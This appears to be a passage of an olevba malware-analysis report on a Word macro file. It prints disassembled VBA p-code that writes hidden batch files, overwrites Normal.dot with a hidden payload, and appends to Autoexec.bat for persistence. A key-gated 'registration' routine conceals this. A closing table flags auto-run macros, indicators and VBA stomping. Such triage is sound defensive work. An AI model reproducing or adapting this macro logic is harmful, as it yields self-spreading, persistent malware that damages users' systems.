' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ -H +R"
' 	PrintItemNL 
' Line #529:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "COPY C:\WINDOWS\COMMAND\ÿÿ.ÿÿ "
' 	Ld mFlTmp 
' 	Concat 
' 	LitStr 0x0009 " /Y > NUL"
' 	Concat 
' 	PrintItemNL 
' Line #530:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ +H +R"
' 	PrintItemNL 
' Line #531:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #532:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "ECHO A > "
' 	Ld FNStrngW$ 
' 	Concat 
' 	PrintItemNL 
' Line #533:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #534:
' Line #535:
' 	Ld FNStrngX$ 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St mResult 
' Line #536:
' Line #537:
' 	Ld FNStrngW$ 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #538:
' 	Loop 
' Line #539:
' Line #540:
' 	OnError ResumeKill1 
' Line #541:
' 	Ld FNStrngW$ 
' 	ArgsCall Kill 0x0001 
' Line #542:
' 	Ld FNStrngX$ 
' 	ArgsCall Kill 0x0001 
' Line #543:
' 	OnError (GoTo 0) 
' Line #544:
' Line #545:
' 	ExitFunc 
' Line #546:
' Line #547:
' 	Label ResumeKill1 
' Line #548:
' 	Resume  
' Line #549:
' Line #550:
' 	EndFunc 
' Line #551:
' Line #552:
' 	FuncDefn (Function mDOSNm(Name9))
' Line #553:
' Line #554:
' 	Ld Name9 
' 	St mDOSNm 
' Line #555:
' Line #556:
' 	LineCont 0x0004 0D 00 04 00
' 	Ld mDOSNm 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 ".DOC"
' 	Ne 
' 	Ld mDOSNm 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 ".DOT"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #557:
' 	Ld mDOSNm 
' 	LitStr 0x0004 ".Doc"
' 	Concat 
' 	St mDOSNm 
' Line #558:
' 	EndIfBlock 
' Line #559:
' Line #560:
' 	Ld mDOSNm 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0008 
' 	Gt 
' 	IfBlock 
' Line #561:
' 	Ld mDOSNm 
' 	LitStr 0x0001 " "
' 	FnInStr 
' 	St mPos 
' Line #562:
' 	Ld mPos 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #563:
' 	LitStr 0x0001 "_"
' 	Ld mDOSNm 
' 	Ld mPos 
' 	LitDefault 
' 	Mid 
' Line #564:
' 	Ld mDOSNm 
' 	LitStr 0x0001 " "
' 	FnInStr 
' 	St mPos 
' Line #565:
' 	Loop 
' Line #566:
' 	Ld mDOSNm 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "~1.Doc"
' 	Concat 
' 	St mDOSNm 
' Line #567:
' 	EndIfBlock 
' Line #568:
' Line #569:
' 	EndFunc 
' Line #570:
' Line #571:
' 	FuncDefn (Sub RegistrCd())
' Line #572:
' Line #573:
' 	ArgsLd CdRegistry 0x0000 
' 	LitStr 0x0006 "110499"
' 	Eq 
' 	IfBlock 
' Line #574:
' 	LitStr 0x0021 "Macro code is already registered."
' 	ArgsCall MsgBox 0x0001 
' Line #575:
' 	ExitSub 
' Line #576:
' 	EndIfBlock 
' Line #577:
' Line #578:
' 	Dim 
' 	VarDefn mMessage
' 	VarDefn mTitle
' 	VarDefn mDefault
' 	VarDefn mKey
' Line #579:
' Line #580:
' 	LitStr 0x0016 "Enter registration key"
' 	St mMessage 
' Line #581:
' 	LitStr 0x0017 "Macro Code Registration"
' 	St mTitle 
' Line #582:
' 	LitStr 0x0000 ""
' 	St mDefault 
' Line #583:
' Line #584:
' 	Ld mMessage 
' 	Ld mTitle 
' 	Ld mDefault 
' 	ArgsLd InputBox 0x0003 
' 	St mKey 
' Line #585:
' Line #586:
' 	Ld mKey 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000B "STING110499"
' 	Eq 
' 	IfBlock 
' Line #587:
' 	ArgsCall (Call) CdRgstrtn 0x0000 
' Line #588:
' 	LineCont 0x0008 08 00 0C 00 0F 00 0C 00
' 	LitStr 0x002C "Macro code has been successfully registered."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002A "You need to restart your computer for the "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "new setting to take efffect."
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #589:
' 	ElseBlock 
' Line #590:
' 	ArgsCall Beep 0x0000 
' Line #591:
' 	LitStr 0x001C "Incorrect Regsistration Key."
' 	ArgsCall MsgBox 0x0001 
' Line #592:
' 	EndIfBlock 
' Line #593:
' Line #594:
' 	EndSub 
' Line #595:
' Line #596:
' 	FuncDefn (Sub CdRgstrtn())
' Line #597:
' Line #598:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\AZ.Bat"
' 	St FNStrng2$ 
' Line #599:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\XZ.Bat"
' 	St FNStrng3$ 
' Line #600:
' 	LitStr 0x0012 "SET WIN_VER=110499"
' 	St FileMarker 
' Line #601:
' Line #602:
' 	ArgsCall (Call) MkLoadrFl 0x0000 
' Line #603:
' Line #604:
' 	Ld Friend 
' 	St hNmbr 
' Line #605:
' Line #606:
' 	Ld FNStrng2$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #607:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	Ld FileMarker 
' 	PrintItemNL 
' Line #608:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #609:
' Line #610:
' 	ArgsCall (Call) MkHsKprFl 0x0000 
' Line #611:
' Line #612:
' 	Ld FNStrng3$ 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St mResult 
' Line #613:
' 	LitStr 0x001C "C:\WINDOWS\TEMP\~_110499.TMP"
' 	St FNStrngW$ 
' Line #614:
' Line #615:
' 	Ld FNStrngW$ 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #616:
' 	Loop 
' Line #617:
' Line #618:
' 	OnError ResumeKill3 
' Line #619:
' 	Ld FNStrngW$ 
' 	ArgsCall Kill 0x0001 
' Line #620:
' 	Ld FNStrng3$ 
' 	ArgsCall Kill 0x0001 
' Line #621:
' 	OnError (GoTo 0) 
' Line #622:
' Line #623:
' 	ExitSub 
' Line #624:
' Line #625:
' 	Label ResumeKill3 
' Line #626:
' 	Resume  
' Line #627:
' Line #628:
' 	EndSub 
' Line #629:
' Line #630:
' 	FuncDefn (Sub MkLoadrFl())
' Line #631:
' Line #632:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\AZ.Bat"
' 	St FNStrng2$ 
' Line #633:
' Line #634:
' 	Ld Friend 
' 	St hNmbr 
' Line #635:
' Line #636:
' 	Ld FNStrng2$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #637:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #638:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ -H -R > NUL"
' 	PrintItemNL 
' Line #639:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "COPY C:\WINDOWS\COMMAND\ÿ.ÿ C:\PROGRA~1\MICROS~1\TEMPLA~1\Normal.dot /Y > NUL"
' 	PrintItemNL 
' Line #640:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ +H +R > NUL"
' 	PrintItemNL 
' Line #641:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "DEL C:\WINDOWS\TEMP\*.DO? > NUL"
' 	PrintItemNL 
' Line #642:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #643:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #644:
' Line #645:
' 	EndSub 
' Line #646:
' Line #647:
' 	FuncDefn (Sub MkHsKprFl())
' Line #648:
' Line #649:
' 	LitStr 0x0019 "C:\WINDOWS\COMMAND\XZ.bat"
' 	St FNStrng3$ 
' Line #650:
' 	LitStr 0x001C "C:\WINDOWS\TEMP\~_110499.TMP"
' 	St FNStrngW$ 
' Line #651:
' Line #652:
' 	Ld Friend 
' 	St hNmbr 
' Line #653:
' Line #654:
' 	Ld FNStrng3$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #655:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #656:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "DEL "
' 	Ld FNStrngW$ 
' 	Concat 
' 	PrintItemNL 
' Line #657:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "ATTRIB C:\WINDOWS\COMMAND\ÿ.BAT -H -R > NUL"
' 	PrintItemNL 
' Line #658:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "COPY C:\WINDOWS\COMMAND\AZ.bat C:\WINDOWS\COMMAND\ÿ.BAT /Y > NUL"
' 	PrintItemNL 
' Line #659:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "ATTRIB C:\WINDOWS\COMMAND\ÿ.BAT +H +R > NUL"
' 	PrintItemNL 
' Line #660:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "DEL C:\WINDOWS\COMMAND\AZ.bat > NUL"
' 	PrintItemNL 
' Line #661:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ -H -R > NUL"
' 	PrintItemNL 
' Line #662:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0043 "COPY C:\WINDOWS\COMMAND\SYSTEM1.DT_ C:\WINDOWS\COMMAND\ÿ.ÿ /y > NUL"
' 	PrintItemNL 
' Line #663:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "DEL C:\WINDOWS\COMMAND\SYSTEM1.DT_ > NUL"
' 	PrintItemNL 
' Line #664:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ +H +R > NUL"
' 	PrintItemNL 
' Line #665:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ -H -R > NUL"
' 	PrintItemNL 
' Line #666:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "COPY C:\WINDOWS\COMMAND\SYSTEM2.DT_ C:\WINDOWS\COMMAND\ÿÿ.ÿÿ /y > NUL"
' 	PrintItemNL 
' Line #667:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "DEL C:\WINDOWS\COMMAND\SYSTEM2.DT_ > NUL"
' 	PrintItemNL 
' Line #668:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ +H +R > NUL"
' 	PrintItemNL 
' Line #669:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "DEL C:\WINDOWS\TEMP\*.DO? > NUL"
' 	PrintItemNL 
' Line #670:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "ATTRIB C:\WINDOWS\COMMAND\SYSTEM1.DT_ -H -R -S > NUL"
' 	PrintItemNL 
' Line #671:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "DEL C:\WINDOWS\COMMAND\SYSTEM1.DT_"
' 	PrintItemNL 
' Line #672:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ECHO A > C:\WINDOWS\COMMAND\SYSTEM1.DT_"
' 	PrintItemNL 
' Line #673:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "ATTRIB C:\WINDOWS\COMMAND\SYSTEM1.DT_ +H +R +S > NUL"
' 	PrintItemNL 
' Line #674:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #675:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "ECHO A > "
' 	Ld FNStrngW$ 
' 	Concat 
' 	PrintItemNL 
' Line #676:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #677:
' Line #678:
' 	EndSub 
' Line #679:
' Line #680:
' 	FuncDefn (Sub MkAutoFl())
' Line #681:
' Line #682:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St FNStrng1$ 
' Line #683:
' Line #684:
' 	Ld Friend 
' 	St hNmbr 
' Line #685:
' Line #686:
' 	Ld FNStrng1$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #687:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #688:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "PROMPT $P$G"
' 	PrintItemNL 
' Line #689:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "SET PATH=C:\WINDOWS\;C:\WINDOWS\COMMAND\"
' 	PrintItemNL 
' Line #690:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	PrintItemNL 
' Line #691:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #692:
' Line #693:
' 	EndSub 
' Line #694:
' Line #695:
' 	FuncDefn (Sub VwMacCd())
' Line #696:
' 	LitStr 0x000B "Access Code"
' 	LitStr 0x000F "View Macro Code"
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "STING"
' 	Eq 
' 	IfBlock 
' Line #697:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #698:
' 	ElseBlock 
' Line #699:
' 	LitStr 0x0015 "Incorrect Access Code"
' 	ArgsCall MsgBox 0x0001 
' Line #700:
' 	EndIfBlock 
' Line #701:
' 	EndSub 
' Line #702:
' Line #703:
' 	FuncDefn (Sub SvTmpPath())
' Line #704:
' Line #705:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St mOldTmpPath 
' Line #706:
' 	LitStr 0x0016 "C:\WINDOWS\TmpPath.Ini"
' 	St FNStrngZ$ 
' Line #707:
' Line #708:
' 	OnError (Resume Next) 
' Line #709:
' 	Ld FNStrngZ$ 
' 	ArgsCall Kill 0x0001 
' Line #710:
' 	OnError (GoTo 0) 
' Line #711:
' Line #712:
' 	Ld Friend 
' 	St hNmbr 
' Line #713:
' Line #714:
' 	Ld FNStrngZ$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #715:
' 	Ld hNmbr 
' 	Sharp 
' 	PrintChan 
' 	Ld mOldTmpPath 
' 	PrintItemNL 
' Line #716:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #717:
' Line #718:
' 	EndSub 
' Line #719:
' Line #720:
' 	FuncDefn (Function RdTmpPath())
' Line #721:
' Line #722:
' 	LitStr 0x0016 "C:\WINDOWS\TmpPath.Ini"
' 	St FNStrngZ$ 
' Line #723:
' Line #724:
' 	Ld FNStrngZ$ 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #725:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St RdTmpPath 
' Line #726:
' 	ElseBlock 
' Line #727:
' 	Ld Friend 
' 	St hNmbr 
' Line #728:
' 	Ld FNStrngZ$ 
' 	Ld hNmbr 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #729:
' 	Ld hNmbr 
' 	Ld RdTmpPath 
' 	LineInput 
' Line #730:
' 	Ld hNmbr 
' 	Sharp 
' 	Close 0x0001 
' Line #731:
' 	EndIfBlock 
' Line #732:
' Line #733:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ZZ.BAT              |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |AZ.bat              |Executable file name                         |
|IOC       |XZ.bat              |Executable file name                         |
|IOC       |CpyFl.Bat           |Executable file name                         |
|IOC       |AZ.Bat              |Executable file name                         |
|IOC       |XZ.Bat              |Executable file name                         |
|IOC       |'ÿ.BAT'             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

